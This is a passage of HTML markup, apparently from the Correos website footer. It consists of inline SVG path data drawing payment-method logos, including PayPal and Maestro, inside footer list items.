C7.82514495,10.2748859 8.24296465,10.2053109 8.71315059,10.2053109 C9.80488498,10.2053109 10.3831341,10.6952961 10.3818388,11.621605 C10.3840593,11.8701134 10.3427955,12.1756139 10.2789568,12.5786305 C10.1686731,13.2780806 9.93182223,14.7781977 9.89962531,15.1432811 L9.89962531,15.1432811 Z" id="Fill-336" fill="#002E6D"></path>
																						<polyline id="Fill-337" fill="#002E6D" points="5.84484981 15.1432811 4.57344186 15.1432811 5.30212829 10.5779809 3.67581415 15.1432811 2.80964319 15.1432811 2.70250519 10.6035164 1.93718089 15.1432811 0.747375451 15.1432811 1.74122382 9.20406099 3.56923127 9.20406099 3.67969998 12.5284847 4.79493441 9.20406099 6.82796587 9.20406099 5.84484981 15.1432811"></polyline>
																						<path d="M28.9999809,12.991084 C28.8665673,12.9759108 28.8084648,12.9710997 28.7170552,12.9710997 C27.9959554,12.9710997 27.6319822,13.2183128 27.6319822,13.7066326 C27.6319822,14.0073222 27.8090652,14.1984682 28.087365,14.1984682 C28.6049211,14.1984682 28.9783313,13.7055224 28.9999809,12.991084 L28.9999809,12.991084 Z M29.9251795,15.1432811 L28.8719334,15.1432811 L28.8958035,14.6427486 C28.5745746,15.0379935 28.1460226,15.226734 27.5640726,15.226734 C26.8744296,15.226734 26.4025783,14.6890085 26.4025783,13.9075858 C26.4025783,12.7312882 27.2243397,12.045346 28.6341574,12.045346 C28.7784883,12.045346 28.9627879,12.0586688 29.1520836,12.082539 C29.191497,11.9230347 29.2016742,11.8553102 29.2016742,11.7692667 C29.2016742,11.4495181 28.9803667,11.3296123 28.3865742,11.3296123 C27.7646557,11.323321 27.2519106,11.4781992 27.0404102,11.5474041 C27.0544732,11.4670968 27.2178633,10.4610358 27.2178633,10.4610358 C27.8506992,10.2748859 28.2688889,10.2053109 28.7383347,10.2053109 C29.8308093,10.2053109 30.4083183,10.6952961 30.407208,11.621605 C30.4094285,11.8701134 30.3685347,12.1756139 30.3043259,12.5786305 C30.1944123,13.2780806 29.9570064,14.7781977 29.9251795,15.1432811 L29.9251795,15.1432811 Z" id="Fill-338" fill="#002E6D"></path>
																						<path d="M15.5488881,15.0698203 C15.2008284,15.1793638 14.9297452,15.226734 14.635532,15.226734 C13.9858576,15.226734 13.6311364,14.8533238 13.6311364,14.1655311 C13.6220695,13.9519953 13.7245815,13.3903997 13.8052588,12.8782098 C13.8789046,12.4268979 14.3566772,9.58209715 14.3566772,9.58209715 L15.6199434,9.58209715 L15.4724667,10.3131891 L16.2357556,10.3131891 L16.0634836,11.4741283 L15.2976042,11.4741283 C15.1508677,12.3924805 14.9415878,13.5367662 14.9391822,13.6884987 C14.9391822,13.9375622 15.0720408,14.0463656 15.3745807,14.0463656 C15.5194668,14.0463656 15.6316009,14.0315624 15.7172743,14.0008458 L15.5488881,15.0698203" id="Fill-339" fill="#002E6D"></path>
																						<path d="M19.4228798,15.0307769 C18.9887766,15.1634504 18.5704018,15.2282143 18.1264915,15.226734 C16.7118628,15.2248836 15.9744795,14.4865751 15.9744795,13.0719464 C15.9744795,11.4210219 16.9124459,10.2053109 18.1860743,10.2053109 C19.2276629,10.2053109 19.8932508,10.8858871 19.8932508,11.9528261 C19.8932508,12.3075473 19.847731,12.6532015 19.7372623,13.1409662 L17.2210921,13.1409662 C17.1361589,13.8417116 17.5843251,14.1335193 18.319858,14.1335193 C18.77154,14.1335193 19.1797376,14.0402593 19.63327,13.8298691 L19.4228798,15.0307769 L19.4228798,15.0307769 Z M18.7126974,12.1674722 C18.7199139,12.0666255 18.8464811,11.3051871 18.124271,11.3051871 C17.7223648,11.3051871 17.4342579,11.6119829 17.3174978,12.1674722 L18.7126974,12.1674722 L18.7126974,12.1674722 Z" id="Fill-340" fill="#002E6D"></path>
																						<path d="M10.661989,11.840322 C10.661989,12.450768 10.9580525,12.8721035 11.6297467,13.1887064 C12.1443422,13.4309234 12.2244644,13.5025338 12.2244644,13.7218059 C12.2244644,14.0224954 11.9972356,14.1590548 11.4944827,14.1590548 C11.1149662,14.1590548 10.7622805,14.099472 10.3553782,13.9679087 C10.3553782,13.9679087 10.1886574,15.0329974 10.1807007,15.0838833 C10.4695477,15.1464267 10.727123,15.2047142 11.5035497,15.226734 C12.8447176,15.226734 13.4642306,14.7160243 13.4642306,13.6122624 C13.4642306,12.9487099 13.205175,12.5592013 12.5682682,12.2660984 C12.0355389,12.0216609 11.9739206,11.9668891 11.9739206,11.7415107 C11.9739206,11.4804197 12.185421,11.347006 12.5960242,11.347006 C12.8456428,11.347006 13.1863009,11.3736518 13.5095653,11.4193566 L13.6903491,10.2991261 C13.3613485,10.2467598 12.8621113,10.2053109 12.571599,10.2053109 C11.1497537,10.2053109 10.657363,10.9478754 10.661989,11.840322" id="Fill-341" fill="#002E6D"></path>
																						<path d="M25.6052421,10.3328033 C25.9582979,10.3328033 26.2880387,10.424583 26.741201,10.6534772 L26.9493707,9.36449043 C26.7624805,9.2912147 26.1072549,8.86173749 25.5521357,8.86173749 C24.7016931,8.86173749 23.9818886,9.28436823 23.4765451,9.98030264 C22.7386067,9.7360502 22.4349565,10.2297362 22.0633967,10.7219419 L21.7331008,10.7989184 C21.7580812,10.6370086 21.780841,10.4762091 21.7736245,10.3131891 L20.6056538,10.3131891 C20.4465196,11.8084951 20.1639639,13.3224902 19.9428415,14.8183513 L19.884924,15.1432811 L21.1567021,15.1432811 C21.3689426,13.7639949 21.4849625,12.8811704 21.5556477,12.283122 L22.0345305,12.0177751 C22.106511,11.7511328 22.3298539,11.6615736 22.7791304,11.6724909 C22.7204728,11.9874285 22.6886459,12.3192048 22.6886459,12.6624535 C22.6886459,14.2428778 23.5424192,15.226734 24.9102329,15.226734 C25.2627336,15.226734 25.5654586,15.180474 26.0341642,15.0527966 L26.256952,13.6994161 C25.8354315,13.9064755 25.4903324,14.0039915 25.1774303,14.0039915 C24.4383816,14.0039915 23.9911406,13.4583093 23.9911406,12.5569808 C23.9911406,11.248935 24.6558033,10.3328033 25.6052421,10.3328033" id="Fill-342" fill="#002E6D"></path>
																						<path d="M36.3675226,9.20406099 L36.084967,10.9199344 C35.7380175,10.4627012 35.3646073,10.1314801 34.8716615,10.1314801 C34.2303138,10.1314801 33.6465134,10.6177645 33.2642214,11.3338682 C32.7318621,11.2233995 32.181739,11.0355842 32.181739,11.0355842 L32.1813689,11.0402102 C32.223743,10.6399693 32.2416919,10.396457 32.2374359,10.3131891 L31.0696502,10.3131891 C30.9110712,11.8084951 30.6281454,13.3224902 30.407208,14.8183513 L30.3487355,15.1432811 L31.6208836,15.1432811 C31.7926004,14.0286017 31.9237936,13.1019228 32.0205694,12.3680553 C32.4554127,11.9750309 32.6730195,11.6332625 33.1113786,11.6554673 C32.9169018,12.1258383 32.8034725,12.6672645 32.8034725,13.2227537 C32.8034725,14.4297679 33.4137335,15.226734 34.3381919,15.226734 C34.804122,15.226734 35.1616187,15.0659345 35.5102336,14.6936345 L35.4502807,15.142911 L36.6530389,15.142911 L37.6213518,9.20406099 L36.3675226,9.20406099 L36.3675226,9.20406099 Z M34.7778463,14.0274915 C34.3452235,14.0274915 34.1261364,13.7066326 34.1261364,13.0752771 C34.1261364,12.1258383 34.5356293,11.4528488 35.1120281,11.4528488 C35.5489069,11.4528488 35.7857577,11.7851801 35.7857577,12.3987718 C35.7857577,13.3563524 35.3694183,14.0274915 34.7778463,14.0274915 L34.7778463,14.0274915 Z" id="Fill-343" fill="#002E6D"></path>
																						<polyline id="Fill-344" fill="#FFFFFF" points="6.21048831 14.7907804 4.93945043 14.7907804 5.66795183 10.2254803 4.04200776 14.7907804 3.17546673 14.7907804 3.06851377 10.251941 2.30300442 14.7907804 1.11319899 14.7907804 2.10704735 8.85211543 3.9350548 8.85211543 3.98612577 12.5284847 5.21960058 8.85211543 7.19378941 8.85211543 6.21048831 14.7907804"></polyline>
																						<path d="M9.34080534,12.6393235 C9.20757674,12.6237802 9.14873411,12.6195242 9.05713944,12.6195242 C8.33659475,12.6195242 7.97206649,12.8663672 7.97206649,13.354317 C7.97206649,13.6546365 8.15007471,13.8468927 8.42781934,13.8468927 C8.94556049,13.8468927 9.31878562,13.3539469 9.34080534,12.6393235 L9.34080534,12.6393235 Z M10.2652638,14.7907804 L9.21220273,14.7907804 L9.2362579,14.290618 C8.91502894,14.6856778 8.48629189,14.8746034 7.90397188,14.8746034 C7.21506898,14.8746034 6.7428476,14.3361378 6.7428476,13.5549001 C6.7428476,12.3784175 7.56442398,11.6934004 8.97461173,11.6934004 C9.11875767,11.6934004 9.30342732,11.7065382 9.49272296,11.7309635 C9.53195138,11.5710892 9.5423136,11.5031796 9.5423136,11.416766 C9.5423136,11.0972024 9.32100609,10.9782219 8.72721361,10.9782219 C8.10511006,10.9708203 7.59236498,11.1256985 7.38141969,11.1947184 C7.39492759,11.1147812 7.55776255,10.1087202 7.55776255,10.1087202 C8.19115353,9.92294032 8.60897323,9.85281026 9.07915917,9.85281026 C10.1707085,9.85281026 10.7487726,10.3433506 10.7478474,11.2692894 C10.7498829,11.5174276 10.7089891,11.8244085 10.6449653,12.2263148 C10.5344966,12.9252099 10.2976458,14.4262521 10.2652638,14.7907804 L10.2652638,14.7907804 Z" id="Fill-345" fill="#FFFFFF"></path>
																						<path d="M27.3150092,9.01198975 L27.1068395,10.3007914 C26.652937,10.0726375 26.3241214,9.98030264 25.9714357,9.98030264 C25.022367,9.98030264 24.356594,10.8975446 24.356594,12.2057754 C24.356594,13.1071039 24.8040201,13.6516758 25.5430687,13.6516758 C25.856156,13.6516758 26.2019952,13.5549001 26.6225905,13.3471004 L26.3992476,14.700481 C25.9312821,14.8279734 25.6283721,14.8746034 25.2760564,14.8746034 C23.9073176,14.8746034 23.0548396,13.8905621 23.0548396,12.3105079 C23.0548396,10.1873621 24.2333576,8.70352853 25.9179592,8.70352853 C26.4730784,8.70352853 27.1286742,8.93871402 27.3150092,9.01198975" id="Fill-346" fill="#FFFFFF"></path>
																						<path d="M29.3656194,12.6393235 C29.233131,12.6237802 29.1741033,12.6195242 29.0826937,12.6195242 C28.362519,12.6195242 27.9978057,12.8663672 27.9978057,13.354317 C27.9978057,13.6546365 28.1756289,13.8468927 28.4531885,13.8468927 C28.9707446,13.8468927 29.3443398,13.3539469 29.3656194,12.6393235 L29.3656194,12.6393235 Z M30.290818,14.7907804 L29.2377569,14.7907804 L29.2616271,14.290618 C28.9403981,14.6856778 28.5116611,14.8746034 27.9298962,14.8746034 C27.2402531,14.8746034 26.7685869,14.3361378 26.7685869,13.5549001 C26.7685869,12.3784175 27.5894231,11.6934004 28.9999809,11.6934004 C29.1441268,11.6934004 29.3284264,11.7065382 29.517537,11.7309635 C29.5569505,11.5710892 29.5673127,11.5031796 29.5673127,11.416766 C29.5673127,11.0972024 29.3465603,10.9782219 28.7523977,10.9782219 C28.1308493,10.9708203 27.6182893,11.1256985 27.4069739,11.1947184 C27.4202968,11.1147812 27.5833168,10.1087202 27.5833168,10.1087202 C28.2167077,9.92294032 28.6341574,9.85281026 29.1043433,9.85281026 C30.1958926,9.85281026 30.7745119,10.3433506 30.7730316,11.2692894 C30.7756221,11.5174276 30.7343582,11.8244085 30.6703345,12.2263148 C30.5602359,12.9252099 30.323385,14.4262521 30.290818,14.7907804 L30.290818,14.7907804 Z" id="Fill-347" fill="#FFFFFF"></path>
																						<path d="M15.9145266,14.7175046 C15.566837,14.8270482 15.2953837,14.8746034 15.0015406,14.8746034 C14.3516811,14.8746034 13.9967749,14.5010082 13.9967749,13.8139557 C13.987893,13.5996797 14.0905901,13.0390093 14.1714524,12.5262642 C14.2445431,12.0745822 14.7225007,9.23015159 14.7225007,9.23015159 L15.986137,9.23015159 L15.8382903,9.9610585 L16.4870395,9.9610585 L16.3142124,11.1216277 L15.6634277,11.1216277 C15.5166912,12.040905 15.3074113,13.1844505 15.3048207,13.3361831 C15.3048207,13.5859867 15.4382344,13.6940499 15.7404043,13.6940499 C15.8852904,13.6940499 15.9972394,13.6798019 16.0832829,13.6483451 L15.9145266,14.7175046" id="Fill-348" fill="#FFFFFF"></path>
																						<path d="M19.7892585,14.6792014 C19.3549702,14.812245 18.9356702,14.8749735 18.492315,14.8746034 C17.0775013,14.8736782 16.3406731,14.1344445 16.3406731,12.7200008 C16.3406731,11.0685213 17.2784544,9.85281026 18.5511577,9.85281026 C19.5938565,9.85281026 20.2590743,10.5333864 20.2590743,11.6016207 C20.2590743,11.9556017 20.2128144,12.3010709 20.103641,12.7890206 L17.5871007,12.7890206 C17.5017974,13.4897661 17.9505187,13.7821288 18.6853115,13.7821288 C19.1373635,13.7821288 19.5453761,13.6884987 19.9994636,13.4775534 L19.7892585,14.6792014 L19.7892585,14.6792014 Z M19.078891,11.8149715 C19.0857374,11.7139398 19.2128597,10.9528714 18.4908347,10.9528714 C18.0885584,10.9528714 17.8004515,11.2602224 17.6833214,11.8149715 L19.078891,11.8149715 L19.078891,11.8149715 Z" id="Fill-349" fill="#FFFFFF"></path>
																						<path d="M11.0276275,11.4878213 C11.0276275,12.0993776 11.3240611,12.5197878 11.9959404,12.8367609 C12.5105358,13.0787928 12.590288,13.1504032 12.590288,13.3698603 C12.590288,13.67092 12.3632442,13.8067391 11.8601212,13.8067391 C11.4809748,13.8067391 11.1281041,13.7478965 10.7210167,13.6167033 C10.7210167,13.6167033 10.5544809,14.6810518 10.5467092,14.7311976 C10.8353712,14.7944812 11.0931315,14.8522136 11.8691882,14.8746034 C13.2107262,14.8746034 13.8302392,14.3640788 13.8302392,13.2603168 C13.8302392,12.5963943 13.5708135,12.2070707 12.9340918,11.9147079 C12.4011774,11.6695303 12.3399292,11.6153136 12.3399292,11.3895652 C12.3399292,11.1284741 12.5512446,10.9941353 12.9622178,10.9941353 C13.2112813,10.9941353 13.5523095,11.0218912 13.8753889,11.067411 L14.0563577,9.94736556 C13.727172,9.8953694 13.2283049,9.85281026 12.9376075,9.85281026 C11.5153922,9.85281026 11.0233716,10.5955597 11.0276275,11.4878213" id="Fill-350" fill="#FFFFFF"></path>
																						<path d="M37.0188624,14.7907804 L35.8164743,14.7907804 L35.8760571,14.3413189 C35.5272572,14.7138039 35.1699455,14.8746034 34.7040155,14.8746034 C33.7802972,14.8746034 33.169111,14.0785625 33.169111,12.8702531 C33.169111,11.2637382 34.1166994,9.90961746 35.237485,9.90961746 C35.7304308,9.90961746 36.103656,10.1109407 36.4513456,10.5683589 L36.7333461,8.85211543 L37.9869903,8.85211543 L37.0188624,14.7907804 L37.0188624,14.7907804 Z M35.1434848,13.6748058 C35.735797,13.6748058 36.1513962,13.0040368 36.1513962,12.0473814 C36.1513962,11.4336046 35.9147304,11.1001631 35.4778516,11.1001631 C34.9012678,11.1001631 34.49196,11.7733376 34.49196,12.7231465 C34.49196,13.3552422 34.711232,13.6748058 35.1434848,13.6748058 L35.1434848,13.6748058 Z" id="Fill-351" fill="#FFFFFF"></path>
																						<path d="M31.4358438,9.9610585 C31.2768947,11.4559944 30.994154,12.9699895 30.7730316,14.4660357 L30.7151141,14.7907804 L31.9865221,14.7907804 C32.4413497,11.8371763 32.5507082,11.2607775 33.2642214,11.332758 C33.3776507,10.7282332 33.5891511,10.1988346 33.7466199,9.93200727 C33.2142606,9.82098343 32.9169018,10.121858 32.5272081,10.6936308 C32.5582948,10.4462327 32.6143619,10.2062361 32.6038146,9.9610585 L31.4358438,9.9610585" id="Fill-352" fill="#FFFFFF"></path>
																						<path d="M20.9720324,9.9610585 C20.8123431,11.4559944 20.5292323,12.9699895 20.30848,14.4660357 L20.2507476,14.7907804 L21.5225256,14.7907804 C21.9775383,11.8371763 22.0865267,11.2607775 22.7989296,11.332758 C22.9130991,10.7282332 23.1249696,10.1988346 23.2820683,9.93200727 C22.7502642,9.82098343 22.4523502,10.121858 22.0633967,10.6936308 C22.0941133,10.4462327 22.1505504,10.2062361 22.139448,9.9610585 L20.9720324,9.9610585" id="Fill-353" fill="#FFFFFF"></path>
																					</g>
																				</g>
																			</g>
																		</g>
																	</svg>
																</figure>
															</div>
														</li>
														<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
															<div class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" alt-image="PayPal">
																<figure class="sc-correos-cdk-imageblock">
																	<svg width="48px" height="15px" viewBox="0 0 48 15" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
																		<title>logos/footer/paypal</title>
																		<g id="UI-KIT" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
																			<g id="Correos_web_UIkit_06_Menu&amp;Footer" transform="translate(-812.000000, -11033.000000)">
																				<g id="molecules/footer/desktop" transform="translate(-240.000000, 10640.000000)">
																					<g id="logos/footer/paypal" transform="translate(1052.000000, 394.000000)">
																						<g id="Paypal-light" transform="translate(24.000000, 6.600000) scale(1, -1) translate(-24.000000, -6.600000) ">
																							<path d="M32.6484466,9.56278215 C32.4469602,8.23981478 31.4366769,8.23981478 30.4591827,8.23981478 L29.9031943,8.23981478 L30.2933366,10.7099241 C30.3166216,10.8591381 30.4454018,10.9689102 30.5965166,10.9689102 L30.851701,10.9689102 C31.5169864,10.9689102 32.1452058,10.9689102 32.4692948,10.5901728 C32.6631779,10.3635006 32.721628,10.0270563 32.6484466,9.56278215 M32.2231392,13.0146625 L28.5374585,13.0146625 C28.2851253,13.0146625 28.0708084,12.8312339 28.0313665,12.5822271 L26.5411274,3.13137395 C26.5116648,2.94509406 26.6561267,2.77639671 26.8443074,2.77639671 L28.7356185,2.77639671 C28.9119191,2.77639671 29.0620835,2.90470174 29.0896454,3.07862633 L29.5125767,5.75830054 C29.5515435,6.00730734 29.7663356,6.190736 30.0181936,6.190736 L31.1843437,6.190736 C33.6121599,6.190736 35.0135359,7.36543979 35.3794428,9.69441361 C35.5443386,10.7123001 35.3860957,11.5125433 34.9094663,12.0728086 C34.3853165,12.6886727 33.4562931,13.0146625 32.2231392,13.0146625" id="Shape" fill="#0079C1"></path>
																							<path d="M6.36031505,9.56278215 C6.15882864,8.23981478 5.14854536,8.23981478 4.17105115,8.23981478 L3.6150627,8.23981478 L4.00520502,10.7099241 C4.02849001,10.8591381 4.15727024,10.9689102 4.30838505,10.9689102 L4.56356949,10.9689102 C5.2288548,10.9689102 5.85707422,10.9689102 6.18116322,10.5901728 C6.37504637,10.3635006 6.43349643,10.0270563 6.36031505,9.56278215 M5.93500765,13.0146625 L2.24932699,13.0146625 C1.99699377,13.0146625 1.78267686,12.8312339 1.74323494,12.5822271 L0.252995831,3.13137395 C0.223533196,2.94509406 0.367519947,2.77639671 0.556175855,2.77639671 L2.31633072,2.77639671 C2.56818874,2.77639671 2.78250565,2.95982538 2.82194757,3.20835696 L3.22444518,5.75830054 C3.26341189,6.00730734 3.47820401,6.190736 3.73006202,6.190736 L4.89621214,6.190736 C7.32402835,6.190736 8.72540435,7.36543979 9.09131128,9.69441361 C9.25620699,10.7123001 9.09796413,11.5125433 8.62133472,12.0728086 C8.09718493,12.6886727 7.1681615,13.0146625 5.93500765,13.0146625" id="Shape" fill="#00457C"></path>
																							<path d="M14.4916698,6.16992207 C14.3210716,5.16153961 13.5208284,4.4843742 12.4996155,4.4843742 C11.987821,4.4843742 11.5777201,4.64926992 11.3144572,4.96100361 C11.0535703,5.26988608 10.9552031,5.7104 11.0378886,6.20033512 C11.1966067,7.20016391 12.0101556,7.89871349 13.0156868,7.89871349 C13.5170268,7.89871349 13.9238013,7.73239216 14.1922914,7.41780725 C14.4626824,7.10084632 14.569128,6.65795638 14.4916698,6.16992207 M16.9513247,9.60517033 L15.1864178,9.60517033 C15.0353029,9.60517033 14.9065227,9.49539826 14.8827625,9.34570906 L14.8053043,8.85244752 L14.6822265,9.03112414 C14.2996875,9.58568698 13.4476471,9.77149166 12.5970323,9.77149166 C10.6472711,9.77149166 8.98168176,8.29360785 8.65759277,6.22124409 C8.48889542,5.18720062 8.72839814,4.19925192 9.31479962,3.50973121 C9.85320553,2.87628455 10.6216101,2.61254644 11.5373278,2.61254644 C13.109302,2.61254644 13.9808257,3.62187931 13.9808257,3.62187931 L13.9019419,3.13146899 C13.8724793,2.9451891 14.016466,2.77649175 14.2055971,2.77649175 L15.7946786,2.77649175 C16.0470118,2.77649175 16.2613287,2.95944521 16.3007707,3.208452 L17.2549799,9.2501931 C17.2844425,9.43647298 17.1399806,9.60517033 16.9513247,9.60517033" id="Shape" fill="#00457C"></path>
																							<path d="M40.7798489,6.16992207 C40.6092507,5.16153961 39.8090075,4.4843742 38.7877946,4.4843742 C38.2760001,4.4843742 37.8658992,4.64926992 37.6026363,4.96100361 C37.3412742,5.26988608 37.2433822,5.7104 37.3260677,6.20033512 C37.4847857,7.20016391 38.2983346,7.89871349 39.3038659,7.89871349 C39.8052059,7.89871349 40.2119803,7.73239216 40.4804705,7.41780725 C40.7508615,7.10084632 40.8573071,6.65795638 40.7798489,6.16992207 M43.2395037,9.60517033 L41.4745968,9.60517033 C41.323482,9.60517033 41.1947018,9.49539826 41.1709416,9.34570906 L41.0934834,8.85244752 L40.9699304,9.03112414 C40.5878665,9.58568698 39.7358261,9.77149166 38.8852113,9.77149166 C36.9354502,9.77149166 35.2698608,8.29360785 34.9457719,6.22124409 C34.7770745,5.18720062 35.0165772,4.19925192 35.6029787,3.50973121 C36.1413846,2.87628455 36.9097892,2.61254644 37.8255069,2.61254644 C39.397481,2.61254644 40.2690048,3.62187931 40.2690048,3.62187931 L40.190121,3.13146899 C40.1606583,2.9451891 40.3046451,2.77649175 40.4937762,2.77649175 L42.0828577,2.77649175 C42.3351909,2.77649175 42.5495078,2.95944521 42.5889497,3.208452 L43.543159,9.2501931 C43.5726216,9.43647298 43.4281597,9.60517033 43.2395037,9.60517033" id="Shape" fill="#0079C1"></path>
																							<path d="M26.3511884,9.60512281 L24.5772527,9.60512281 C24.4076049,9.60512281 24.2488868,9.52101174 24.1538461,9.38035142 L21.7065465,5.77640581 L20.6696518,9.23969109 C20.6045489,9.45638402 20.4049633,9.60512281 20.1787663,9.60512281 L18.4352436,9.60512281 C18.2247283,9.60512281 18.0764647,9.39793396 18.1444188,9.19882356 L20.0975064,3.46501453 L18.2603686,0.872777815 C18.1163818,0.669390589 18.2617942,0.38806994 18.5112762,0.38806994 L20.2833111,0.38806994 C20.4510581,0.38806994 20.6083505,0.470280197 20.7043417,0.608089299 L26.6035217,9.12279096 C26.7446572,9.32665339 26.5992448,9.60512281 26.3511884,9.60512281" id="Shape" fill="#00457C"></path>
																							<path d="M45.3196609,12.7549637 L43.8070872,3.13113635 C43.7776245,2.94485646 43.9216113,2.77615911 44.1102672,2.77615911 L45.6318697,2.77615911 C45.8837278,2.77615911 46.0985199,2.95958777 46.1374866,3.20859456 L47.6291513,12.6594477 C47.6586139,12.8457276 47.5146272,13.0144249 47.3254961,13.0144249 L45.6233161,13.0144249 C45.4717261,13.0144249 45.3429458,12.9046529 45.3196609,12.7549637" id="Shape" fill="#0079C1"></path>
																						</g>
																					</g>
																				</g>
																			</g>
																		</g>
																	</svg>
																</figure>
															</div>
														</li>
														
														<li class="cdk-pay-list__container-img sc-correos-cdk-core-footer">
															<div class="--padding sc-correos-cdk-core-footer sc-correos-cdk-imageblock-h sc-correos-cdk-imageblock-s hydrated" alt-image="Maestro">
																<figure class="sc-correos-cdk-imageblock">
																	<svg width="40px" height="25px" viewBox="0 0 40 25" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
																		<title>logos/footer/maestro</title>
																		<g id="UI-KIT" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
																			<g id="Correos_web_UIkit_06_Menu&amp;Footer" transform="translate(-744.000000, -11028.000000)">
																				<g id="molecules/footer/desktop" transform="translate(-240.000000, 10640.000000)">
																					<g id="Group-10" transform="translate(984.000000, 388.000000)">
																						<path d="M39.9927731,12.0101398 C39.9927731,18.6433416 34.6372599,24.0199 28.0292782,24.0199 C21.42262,24.0199 16.0663505,18.6433416 16.0663505,12.0101398 C16.0663505,5.37674821 21.42262,1.42108547e-14 28.0292782,1.42108547e-14 C34.6372599,1.42108547e-14 39.9927731,5.37674821 39.9927731,12.0101398" id="Fill-356" fill="#CC0000"></path>
																						<path d="M18.7877847,19.6369268 C18.4574612,19.2347478 18.1532308,18.8097932 17.8766062,18.3649099 L22.1165451,18.3649099 C22.3710473,17.9572268 22.60078,17.532462 22.8059322,17.0930828 L17.1875972,17.0930828 C16.9960588,16.6816038 16.8258864,16.2572186 16.6810509,15.8216353 L23.3115332,15.8216353 C23.710871,14.6240187 23.9266117,13.3428916 23.9266117,12.0101398 C23.9266117,11.137455 23.8339623,10.286407 23.6581175,9.46686518 L16.3354119,9.46686518 C16.4280613,9.03355952 16.544913,8.60955389 16.6825635,8.19503809 L23.3107769,8.19503809 C23.165374,7.75945487 22.9961471,7.33525944 22.8047977,6.92378039 L17.1887317,6.92378039 C17.393884,6.48440123 17.6241839,6.0603956 17.8779298,5.6517635 L22.1152215,5.6517635 C21.838786,5.20801902 21.5337993,4.78382359 21.2040431,4.38107518 L18.7892973,4.38107518 C19.1608403,3.92841026 19.5645269,3.50345565 19.9967647,3.11000728 C17.8733918,1.17730838 15.0551485,1.42108547e-14 11.9638731,1.42108547e-14 C5.35626951,1.42108547e-14 1.42108547e-14,5.37674821 1.42108547e-14,12.0101398 C1.42108547e-14,18.6433416 5.35626951,24.0199 11.9638731,24.0199 C15.0553376,24.0199 17.87377,22.8425916 19.9967647,20.9106519 C20.4295697,20.5164443 20.8338236,20.0905407 21.2053666,19.6369268 L18.7877847,19.6369268" id="Fill-357" fill="#0066CC"></path>
																						<path d="M19.8262142,15.2556618 C19.3149408,15.3915562 18.8204956,15.457985 18.2978773,15.4568462 C16.6303773,15.4553279 15.761931,14.6929149 15.761931,13.2348973 C15.761931,11.5314727 16.8674841,10.2786253 18.3682153,10.2786253 C19.5957252,10.2786253 20.3792744,10.9810626 20.3792744,12.0816931 C20.3792744,12.4468618 20.3263319,12.8027304 20.1964336,13.3056914 L17.2310857,13.3056914 C17.1255789,14.0178083 17.6434701,14.3304034 18.525152,14.3304034 C19.0532535,14.3304034 19.5306815,14.2351255 20.0597285,14.0216043 L19.8262142,15.2556618 L19.8262142,15.2556618 Z M19.0288622,12.301098 C19.0288622,12.1936731 19.1937403,11.4291724 18.3355043,11.41266 C17.8616689,11.41266 17.5218914,11.7288612 17.3844299,12.301098 L19.0288622,12.301098 L19.0288622,12.301098 Z" id="Fill-359" fill="#002E6D"></path>
																						<path d="M20.8307984,11.9670559 C20.8307984,12.5962317 21.1836224,13.0310558 21.9858905,13.354659 C22.5990782,13.6067089 22.6955092,13.6797806 22.6955092,13.9050691 C22.6955092,14.2172846 22.4247461,14.3603912 21.8230923,14.3565953 C21.3713792,14.3533687 20.9589949,14.2981379 20.472491,14.1628129 L20.2571284,15.3105131 C20.6897444,15.4112951 21.2961252,15.4443197 21.8336808,15.4568462 C23.4350027,15.4568462 24.174307,14.9305402 24.174307,13.7928994 C24.174307,13.1088724 23.8659169,12.7066933 23.1054355,12.4068147 C22.4697472,12.1517281 22.3952496,12.0968768 22.3952496,11.8658944 C22.3952496,11.5948648 22.6471047,11.4578316 23.1381464,11.4578316 C23.4359481,11.4578316 23.8434163,11.4851624 24.2302748,11.5322319 L24.44715,10.3782685 C24.0531065,10.3234173 23.4554234,10.2793845 23.1092171,10.2793845 C21.4127878,10.2793845 20.8256932,11.045973 20.8307984,11.9670559" id="Fill-360" fill="#002E6D"></path>
																						<path d="M14.9490744,15.3746643 L13.7051145,15.3746643 L13.7348001,14.8515848 C13.3555048,15.2642027 12.8500929,15.4564666 12.1644874,15.4564666 C11.3529543,15.4564666 10.797058,14.8994136 10.797058,14.0982821 C10.797058,12.880547 11.7634479,12.1781098 13.4250864,12.1781098 C13.595826,12.1781098 13.8130794,12.1910159 14.0361943,12.2162589 C14.0823299,12.0532236 14.0948092,11.9829989 14.0948092,11.8945536 C14.0948092,11.5612708 13.833311,11.4384724 13.1340917,11.4384724 C12.4447045,11.4411295 11.9795668,11.5438095 11.5478962,11.6601548 L11.7604226,10.543012 C12.506912,10.3524562 12.9954957,10.2786253 13.5485559,10.2786253 C14.835248,10.2786253 15.514803,10.7853822 15.514803,11.7370225 C15.5255805,11.9911601 15.4376582,12.5009538 15.3932243,12.7241546 C15.3429289,13.048517 14.9863233,14.9305402 14.9490744,15.3746643 L14.9490744,15.3746643 Z M13.8571351,13.1529052 C13.6996311,13.1373419 13.630995,13.1325969 13.5230301,13.1325969 C12.6746263,13.1325969 12.2444684,13.3861652 12.2444684,13.8866589 C12.2444684,14.2009621 12.4543476,14.3974016 12.7816458,14.3974016 C13.391241,14.3974016 13.8314202,13.8855201 13.8571351,13.1529052 L13.8571351,13.1529052 Z" id="Fill-361" fill="#002E6D"></path>
																						<path d="M26.7953395,15.2957089 C26.387304,15.4078787 26.0690817,15.4568462 25.7251445,15.4568462 C24.9631504,15.4568462 24.5469845,15.0658652 24.5469845,14.3696913 C24.5229713,14.1783763 24.7092155,13.2946832 24.7515695,13.048517 C24.7935453,12.8015916 25.453625,9.20190911 25.453625,9.20190911 L26.9341245,9.20190911 L26.7102533,10.3930726 L27.4696002,10.3930726 L27.2633135,11.6083404 L26.5005632,11.6083404 C26.5005632,11.6083404 26.0821282,13.7183093 26.0821282,13.8796364 C26.0821282,14.1352924 26.2364178,14.2465133 26.5909436,14.2465133 C26.7603596,14.2465133 26.8913923,14.2305703 26.9925504,14.2002029 L26.7953395,15.2957089" id="Fill-362" fill="#002E6D"></path>
